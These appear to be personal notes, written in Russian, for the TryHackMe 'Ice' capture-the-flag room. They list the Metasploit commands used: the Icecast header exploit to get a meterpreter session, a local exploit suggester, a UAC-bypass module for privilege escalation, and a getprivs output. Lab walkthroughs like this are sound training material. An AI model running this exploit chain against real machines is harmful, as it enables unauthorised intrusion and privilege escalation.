## Ice

### Link: https://tryhackme.com/room/ice

#### Useful site: https://www.cvedetails.com/documentation/

### Task 4

```
getuid - показывает, под каким пользователем выполнятся сессия.

sysinfo
```

```
msfconsole
search Icecast
use 0
```

#### локальный priv‑esc под систему
```
run post/multi/recon/local_exploit_suggester
```


```
 use exploit/windows/local/bypassuac_eventvwr

 set LHOST
 set LPORT

```

### Logic:

```
Эксплойт удалённый

    exploit/windows/http/icecast_header даёт первый доступ (meterpreter) от имени какого‑то пользователя/сервиса, но ещё не SYSTEM.


Пост‑модуль (опционально)

    post/multi/recon/local_exploit_suggester должен был посмотреть на систему и предложить локальные эксплойты для повышения привилегий.

    ​

Локальный эксплойт для priv‑esc

    exploit/windows/local/bypassuac_eventvwr — один из таких локальных эксплойтов: он запускается уже изнутри скомпрометированной машины и поднимает твои права (обходит UAC, даёт более высокий контекст)
```

#### Продолжаем
```
getprivs


Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```
